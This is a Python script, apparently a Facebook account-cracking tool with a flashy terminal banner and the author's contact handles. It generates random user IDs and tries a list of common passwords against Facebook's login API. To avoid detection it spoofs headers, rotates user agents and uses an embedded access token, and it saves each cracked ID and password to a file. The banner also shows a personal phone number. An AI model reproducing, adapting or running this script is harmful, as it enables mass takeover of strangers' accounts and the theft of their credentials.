"Mozilla/5.0 (Web0S 100.0; Linux/SmartTV) (compatible; Google Desktop/6.0; http://desktop.google.com/)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:74.125.216.46]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html) [ip:74.125.216.48]"
"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15063"
"Mozilla/5.0 (compatible; Google Desktop/5.9.1005.12335; http://desktop.google.com/)"
"Mozilla/5.0 (compatible; Google Desktop/5.9.909.2235; http://desktop.google.com/)"
"https://user-agents.net/string/mozilla-5-0-compatible-google-desktop-5-9-911-3589-http-desktop-google-com"
"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"
"Mozilla/5.0 (Windows Phone 10.0; Android 7.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Mobile Safari/537.36 Edge/16.16299"
"Mozilla/5.0 (Windows Phone 10.0; Android 10; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 Edge/16.16299"
"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393"
"NokiaC1-01/2.0 (05.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; NokiaC1-01) U2/1.0.0 UCBrowser/9.5.0.449 U2/1.0.0 Mobile UNTRUSTED/1.0"
"NokiaC3-00/5.0 (04.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Windows; U; Windows NT 6.0; vi; Desktop) AppleWebKit/534.13 (KHTML, like Gecko) UCBrowser/9.4.1.377 UNTRUSTED/1.0"
"NokiaC1-01/2.0 (06.15) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; nokiac1-01) U2/1.0.0 UCBrowser/8.9.0.251 U2/1.0.0 Mobile UNTRUSTED/1.0"
"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Mobile Safari/537.36 Edge/16.16299"
"Nokia2690/2.0 (10.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokia2690) UCBrowser8.3.0.154/69/444/UCWEB Mobile UNTRUSTED/1.0"
"Nokia311/5.0 (07.36) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Windows; U; Windows NT 6.0; es-LA; Desktop) AppleWebKit/534.13 (KHTML, like Gecko) UCBrowser/9.5.0.449"
"Nokia5130c-2/2.0 (07.97) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; Nokia5130c-2) U2/1.0.0 UCBrowser/9.5.0.449 U2/1.0.0 Mobile UNTRUSTED/1.0"
"NokiaC2-01/5.0 (11.40) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; ar; nokiac2-01) U2/1.0.0 UCBrowser/8.9.0.251 U2/1.0.0 Mobile UNTRUSTED/1.0"
"NokiaC2-01/5.0 (11.40) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiac2-01) UCBrowser8.4.0.159/70/352/UCWEB Mobile UNTRUSTED/1.0"
"NokiaC2-01/5.0 (11.40) Profile/MIDP-2.1 Configuration/CLDC-1.1 http://www.google.com/bot.html; AppleWebKit/528.18(KHTML,like Gecko) Version/4.0 Mobile/7A341 Safari/528.16/UCWEB8.0.3.99/70/350 UNTRUSTED/1.0"
"Nokia305/2.0 (03.60) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; nokia305) U2/1.0.0 UCBrowser/8.9.0.251 U2/1.0.0 Mobile UNTRUSTED/1.0"
"Nokia110/2.0+(03.33)+Profile/MIDP-2.1+Configuration/CLDC-1.1+UCWEB/2.0+(Java;+U;+MIDP-2.0;+en-US;+Nokia110)+U2/1.0.0+UCBrowser/9.5.0.449+U2/1.0.0+Mobile+UNTRUSTED/1.0"
"Nokia206/2.0 (04.52) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2)/UC Browser8.0.3.107/69/444 UNTRUSTED/1.0"
"Nokia6303iclassic/5.0 (09.83) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; Nokia6303iclassic) U2/1.0.0 UCBrowser/9.5.0.449 U2/1.0.0 Mobile UNTRUSTED/1.0"
"Nokia3120classic/2.0 (10.00) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; Nokia3120classic) U2/1.0.0 UCBrowser/9.5.0.449 U2/1.0.0 Mobile UNTRUSTED/1.0"
"NokiaC2-01/5.0 (11.40) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2) UNTRUSTED/1.0"
"Nokia210/2.0 (06.09) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokia210) UCBrowser8.4.0.159/69/444/UCWEB Mobile UNTRUSTED/1.0"
"Nokia6111/2.0 (03.70) Profile/MIDP-2.0 Configuration/CLDC-1.1 Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2) UCBrowser8.4.0.159/69/444, Nokia6111/2.0 (03.70) Profile/MIDP-2.0 Configuration/CLDC-1.1 UNTRUSTED/1.0"
"Nokia210.3/2.0 (04.12) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; nokia210.3) U2/1.0.0 UCBrowser/8.9.0.251 U2/1.0.0 Mobile UNTRUSTED/1.0"
"Nokia5130/2.0 (07.95) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; ru; Nokia5130) U2/1.0.0 UCBrowser/9.5.0.449 U2/1.0.0 Mobile UNTRUSTED/1.0"
"NokiaX2-01/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; NokiaX2-01) U2/1.0.0 UCBrowser/9.5.0.449 U2/1.0.0 Mobile UNTRUSTED/1.0"
"Nokia311/5.0 (05.92) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Windows; U; Windows NT 6.0; ar-SA; Desktop) AppleWebKit/534.13 (KHTML, like Gecko) UCBrowser/9.4.1.377 UNTRUSTED/1.0"
"Nokia6303iclassic/5.0 (10.80) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; Nokia6303iclassic) U2/1.0.0 UCBrowser/9.5.0.449 U2/1.0.0 Mobile UNTRUSTED/1.0"
"Nokia2020/2.0 (20.52) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; nokia2020) U2/1.0.0 UCBrowser/8.9.0.251 U2/1.0.0 Mobile UNTRUSTED/1.0"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 Mozilla/5.0 (Linux; GoogleTV 3.2; NSZ-GS7/GX70 Build/MASTER) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.77 Safari/534.24"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Safari/537.36 Edg/102.0.1245.44 Mozilla/5.0 (Linux; GoogleTV 3.2; NSZ-GS7/GX70 Build/MASTER) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.77 Safari/534.24"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Mozilla/5.0 (Linux; GoogleTV 3.2; NSZ-GS7/GX70 Build/MASTER) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.77 Safari/534.24"
"Nokia113/2.0 (03.47) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokia113) UCBrowser8.3.0.154/69/352/UCWEB Mobile UNTRUSTED/1.0"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Mozilla/5.0 (Linux; GoogleTV 3.2; NSZ-GS7/GX70 Build/MASTER) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.77 Safari/534.24"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Mozilla/5.0 (Linux; GoogleTV 3.2; NSZ-GS7/GX70 Build/MASTER) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.77 Safari/534.24"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; GoogleTV 3.2; NSZ-GS7/GX70 Build/MASTER) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.77 Safari/534.24"
"Mozilla/5.0 (X11; CrOS x86_64 14469.41.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.57 Safari/537.36 Mozilla/5.0 (Linux; GoogleTV 3.2; LG Google TV G3 Build/MASTER) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.77 Safari/534.24"
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1.23) Gecko/20090825 MultiZilla/1.8.3.4e SeaMonkey/1.1.18"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.12) Gecko/20080201 MultiZilla/1.8.3.4e SeaMonkey/1.1.8"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.16) Gecko/20080702 MultiZilla/1.8.3.4e SeaMonkey/1.1.11"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.19) Gecko/20081204 MultiZilla/1.8.3.5c SeaMonkey/1.1.14"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.20.17-301e3e6efcc9"
"Mozilla/5.0 (OS/2; U; Warp 4.5; en-US; rv:1.9a1) Gecko/20051119 MultiZilla/1.8.1.0s SeaMonkey/1.5a"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.8) Gecko/20061030 MultiZilla/1.8.3.0a SeaMonkey/1.0.6"
"Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.36.16-3e9e4e8dd287"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.36.10-010e3e5a2863"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.32.3-b9bd4364fd17"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.28.5-4a6fbab3952d"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) qutebrowser/1.13.1 QtWebEngine/5.14.2 Chrome/77.0.3865.129 Safari/537.36"
"Mozilla/5.0 (Linux mips; U;HbbTV/1.1.1 (+RTSP;Dream Property GmbH;Dreambox;0.1a;1.0;) CE-HTML/1.0; en) AppleWebKit/535.19 no/Volksbox QtWebkit/2.2"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.40.3-8dcf2c39be86"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.40.4-ffa5212dba76"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) qutebrowser/2.4.0 QtWebEngine/5.15.6 Chrome/95.0.4628.2 Safari/537.36"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) qutebrowser/2.1.1 QtWebEngine/5.15.3 Chrome/87.0.4280.144 Safari/537.36"
sd=(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb,cc,dd,ee,ff,gg,hh,ii,jj,kk,ll,mm,nn,oo,pp,qq,rr,ss,tt,uu,vv)
ugen.append(sd)
for ua in range(100000):
    a='Mozilla/5.0 (Windows NT'
    b=random.choice(['9','10','11','12','13'])
    t='0'
    c='Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    d=random.randrange(62,115)
    e='0'
    f=random.randrange(3200,5900)
    g=random.randrange(40,150)
    h='Safari/537.36'
    lol=f'{a} {b}.{t}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
#-------------------------(System Colour)------------------------->>>
G = "\033[38;5;46m";G0 = "\x1b[38;5;46m";B ="\033[1;34m";G1 = "\x1b[38;5;47m";G2 = "\x1b[38;5;48m";G3 = "\x1b[38;5;49m";G4 = "\x1b[38;5;50m";G5 = "\x1b[38;5;51m";G6 = "\x1b[38;5;52m";s = "\033[0m";W = "\033[1;30m";Y = "\x1b[1;93m";R = "\033[1;91m";RE = "\033[1;31m";B = "\033[1;95m";BE = "\x1b[1;35m";X = "\x1b[1;96m";Z = "\x1b[1;95m";Y = "\033[1;93m";U = "\033[1;94m";V = "\033[38;5;47m";T = "\033[38;5;48m";Q = "\033[38;5;49m";P = "\033[38;5;50m";O = "\033[38;5;51m";N = "\033[38;5;52m";M = "\033[38;5;53m";L = "\033[96;1m";K = "\x1b[1;91m";WH = "\033[1;97m"
colors = ["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"]
xoxo = random.choice(colors)
style = f'{G}[{X}◆{G}]{G}'
#/-----logo-----/

#_____________[Welcome]_________________#

os.system("clear")
print("\n\n\t\033[0;92m🌺 < ━━━━━━━━━━━━ [★] 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐌𝐘 𝐖𝐎𝐑𝐋𝐃 [★] ━━━━━━━━━━━━━━━ > 🌺")
print("   \033[0;96m 🔥 𝐓𝐄𝐀𝐌༆᭄̲̲̲̞̎̎͢𝐎𝐍𝐄»̶̶͓𝐒𝐇𝐎𝐓»̶̶͓𝐎𝐍𝐄»̶̶͓𝐊𝐈𝐋𝐋༎︵🔥")
time.sleep(3)
attemps = 0
while attemps < 12345677901:
    username = input('\n\t\033[0;92mEnter Username : ')
    password = input('\t\033[0;93mEnter Password : ')

    if username == 'xx' and password == 'xxx':
        print('\n\t\033[0;92mYou Have Successfully Logged in.')
        time.sleep(2)
       # os.system("xdg-open https://t.me/DARK_TEAM_LMNx9")
        break
    else:
        print('\n\t\033[0;91mIncorrect Pass Please Trying ')
        time.sleep(2)
        #os.system("xdg-open https://t.me/DARK_LMNx999")
        os.system('clear')
        attemps += 1
        continue

#__________________________________________#
sh = input("[√] FUCK YOUR MIND : ")
logo =("""   \033[92;1m< ━━━━━━━━━━━━ [★] 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐌𝐘 𝐖𝐎𝐑𝐋𝐃 [★] ━━━━━━━━━━━━━━━ >
\033[1;31m┏━━┓━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━═━┏━━┓
\033[1;31m┃😈┃\033[47m\033[1;46m𝐓𝐄𝐀𝐌༆᭄̲̲̲̞̎̎͢𝐎𝐍𝐄»̶̶͓𝐒𝐇𝐎𝐓»̶̶͓𝐎𝐍𝐄»̶̶͓𝐊𝐈𝐋𝐋༎︵\033[97;1m   \033[40m\033[00m\x1b[1;91m┃😈┃
\033[1;31m┗━━┛━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━═━┗━━┛
\033[1;31m┏\033[1;32m━━━═━═━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━═━═━━═━═━═━═━═━═━═━━━═━═━
\033[1;32m┃ \033[1;31m┏━┓ \033[1;36m➤ \033[1;31m \033[1;32m       \033[1;31m____ \033[1;33m  ____  \033[1;35m       ____    ____ \033[1;33m     _  \033[1;31m  ___      _ \033[1;32m                         
\033[1;32m┃ \033[1;31m┃\033[1;32mO\033[1;31m┃ \033[1;31m➤ \033[1;31m  \033[1;31m   `MM' \033[1;34m  6MMMMb \033[1;36m MM'    `MM'  \033[1;35m $$$$$$\ \033[1;32m    `MM\     `M' \033[1;32m                    \033[1;31m I\033[1;37m  
\033[1;32m┃ \033[1;31m┃\033[1;32mN\033[1;31m┃ \033[1;32m➤ \033[1;31m  \033[1;31m    MM \033[1;34m 6M'    `\033[1;36m  MM      MM  \033[1;35m  $$  __$$\ \033[1;32m   MMM\     M \033[1;32m                      \033[1;35mS\033[1;37m
\033[1;32m┃ \033[1;31m┃\033[1;32mE\033[1;31m┃ \033[1;33m➤ \033[1;31m \033[1;31m     MM \033[1;34m MM \033[1;36m       MM      MM  \033[1;35m  $$ /  $$ | \033[1;32m  M\MM\    M \033[1;32m                      \033[1;34mH \033[1;37m
\033[1;32m┃ \033[1;31m┃\033[1;32mS\033[1;31m┃ \033[1;34m➤ \033[1;31m \033[1;31m     MM \033[1;34m YM \033[1;36m       MM      MM  \033[1;35m  $$ /  $$ | \033[1;32m  M \MM\   M \033[1;32m                     \033[1;31m A\033[1;37m
\033[1;32m┃ \033[1;31m┃\033[1;36mH\033[1;31m┃ \033[1;35m➤ \033[1;31m \033[1;31m     MM \033[1;34m  YMMMMb \033[1;36m  MMMMMMMMMM \033[1;33m   $$$$$$$$ |\033[1;31m   M  \MM\  M \033[1;32m                      \033[1;34mN\033[1;37m
\033[1;32m┃ \033[1;31m┃\033[1;36mO\033[1;31m┃ \033[1;35m➤ \033[1;31m \033[1;31m     MM \033[1;34m     `Mb \033[1;36m  MM      MM  \033[1;35m  $$  __$$ | \033[1;32m  M   \MM\ M \033[1;32m                      \033[1;31m 𝐎𝐍𝐄\033[1;37m
\033[1;32m┃ \033[1;31m┃\033[1;36mT\033[1;31m┃ \033[1;35m➤ \033[1;31m \033[1;31m     MM \033[1;34m       MM \033[1;36m MM      MM  \033[1;35m  $$ |  $$ | \033[1;32m  M    \MM\M \033[1;32m                        \033[1;35m𝐒𝐇𝐎𝐓 \033[1;37m
\033[1;32m┃ \033[1;31m┃\033[1;36m™\033[1;31m┃ \033[1;35m➤ \033[1;31m \033[1;31m     MM \033[1;34m        MM \033[1;36mMM      MM  \033[1;35m  $$ |  $$ | \033[1;32m  M     \MMM \033[1;32m                         \033[1;34m𝐎𝐍𝐄\033[1;37m
\033[1;32m┃ \033[1;31m┃\033[1;36m√\033[1;31m┃ \033[1;35m➤ \033[1;31m \033[1;31m     MM \033[1;34m  L   ,M9 \033[1;36m MM      MM  \033[1;35m  $$ |  $$ | \033[1;32m  M      \MM \033[1;32m                           \033[1;34m𝐊𝐈𝐋𝐋 \033[1;37m
\033[1;32m┃ \033[1;31m┗━┛ \033[1;36m➤ \033[1;31m     \033[1;31m_MM_ \033[1;34m.MYMMMM9\033[1;36m _MM_    _MM_ \033[1;33m  \__|  \__| \033[1;32m _M_      \M \033[1;32m    [ ALWAYS LOVE༆᭄̲̲̲̞̎̎͢.    \033[1;31𝄟⃝🔥 \033[1;37m
\033[1;31m┃\033[1;32m━━━═━═━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━═━═━━═━═━═━═━═━═━═━━━═━═━━━
\033[1;32m┃ 🍁  \033[1;31m➤  \033[1;36m\033[1;34m 𝘽𝘼𝙉𝙂𝙡𝘼𝘿𝙀𝙎𝙃\033[1;37\033[1;31m 𝘾𝙔𝘽𝙀𝙍 \033[1;37 \033[1;35m𝙆𝙄𝙉𝙂🌍\033[1;37m\033[1;33m𝄟⃝🔥  \033[1;32m
\033[1;32m┃ 🍁  \033[1;31m➤  \033[1;36m𝗧𝗢𝗢𝗟\033[1;33m𝄟⃝🔥TAYP   \033[1;32m➤   \033[1;33m𝄟⃝🔥\033[1;36mOLD CHECKED  2009-2014\033[1;33m𝄟⃝🔥  \033[1;32m
\033[1;32m┃ \033[1;31m┏━┓ \033[1;30m➤ \033[1;32m┏\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;32m┓ \033[1;32m
\033[1;32m┃ \033[1;31m┃\033[1;32mO\033[1;31m┃ \033[1;32m➤ \033[1;31m┃  \033[1;33m⌠\033[1;32mI\033[1;33m⌡  \033[1;32m𝐀𝐮𝐭𝐡𝐨𝐫      \033[1;32m➤   \033[1;32mISHAN RAJ    \033[1;31m
\033[1;32m┃ \033[1;31m┃\033[1;32mN\033[1;31m┃ \033[1;37m➤ \033[1;31m┃  \033[1;33m⌠\033[1;32mS\033[1;33m⌡  \033[1;30m𝐆𝐢𝐭𝐇𝐮𝐛      \033[1;32m➤   \033[1;30mIshan143z    \033[1;31m 
\033[1;32m┃ \033[1;31m┃\033[1;32mE\033[1;31m┃ \033[1;33m➤ \033[1;31m┃  \033[1;33m⌠\033[1;32mH\033[1;33m⌡  \033[1;35mWhatsup     \033[1;32m➤   \033[1;35m+08801740186636\033[1;31m
\033[1;32m┃ \033[1;31m┃\033[1;32mK\033[1;31m┃ \033[1;34m➤ \033[1;31m┃  \033[1;33m⌠\033[1;32mA\033[1;33m⌡  \033[1;36m𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦    \033[1;32m➤   \033[1;36m@Ishan101  \033[1;31m 
\033[1;32m┃ \033[1;31m┃\033[1;32mI\033[1;31m┃ \033[1;35m➤ \033[1;31m┃  \033[1;33m⌠\033[1;32mN\033[1;33m⌡  \033[1;34mVERSION'S   \033[1;32m➤   \033[1;34m("°V-3.0⋯") \033[1;31m 
\033[1;32m┃ \033[1;31m┃\033[1;32mL\033[1;31m┃ \033[1;35m➤ \033[1;31m┃  \033[1;33m⌠\033[1;32m√\033[1;33m⌡  \033[1;34mWISHE       \033[1;32m➤   \033[1;34mISHAN PROPARTEY \033[1;31m 
\033[1;32m┃ \033[1;31m┗━┛ \033[1;36m➤ \033[1;32m┗\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;32m┛ \033[1;32m┃
\033[1;31m┗\033[1;32m< ━━━━━━━━━━━━ [★] JUST‌‌‌‌‌‌√WITE√AND√SEE★] ━━━━━━━━━━━━━━━ >━━━═━═━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━══━═━\033[1;33m┛""")   
def main():
    user=[]
    os.system("clear")
    print(logo)
    limit=input(" input limit: ")
    print("—"*20)
    print("[1] METHOD=01")
    print("[2] METHOD=02 ")
    print("—"*20)
    ask=input("choice !>")
   # limit=input(" input limit: ")
    print("—"*20)
    if ask in["1"]:
        star="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,9999999999)))
            user.append(data)
    else:
        star="100000"
        for i in range(int(limit)):
            data=str(random.choice(range(100000000,999999999)))
            user.append(data)
    
    with ThreadPool(max_workers=40) as heron:
        print(" IF NO RESULT USE AIRPLANE MODE 3 MUNITS ")
        print(" ID LOGIN AFTER 3 DAYS ")
        
        print("—"*20)
        for mal in user:
            uid=star+mal
            heron.submit(login,uid)
    
loop=0
oks=[]

def login(uid):
    global oks,loop
    Session=requests.session()    
    uaa = random.choice(ugen)
    try:
        sys.stdout.write(f"\r \x1b[38;5;196m[\033[38;5;46mISHAN\x1b[1;97m-\033[38;5;46mOLD\x1b[38;5;196m] \033[38;5;46m[{loop}-{len(oks)}]")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","1234567","12345678","123456789","123123", "@#@#@#"," @@@###","@@@@@@","102030","usausa","facebook","password"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": uaa,
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r [SHOT-ON🖤] {uid} • {pw}")
                open("/sdcard/ISHAN-PROPARTYloginAfter3day.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r [SHOT-ON💚] {uid} • {pw}")
                open("/sdcard/ISHAN-PROPARTYloginAfter3day.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r [SHOT-ON❤️] {uid} • {pw}")
                open("/sdcard/ISHAN-PROPARTYloginAfter3day.txt.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass


main()

























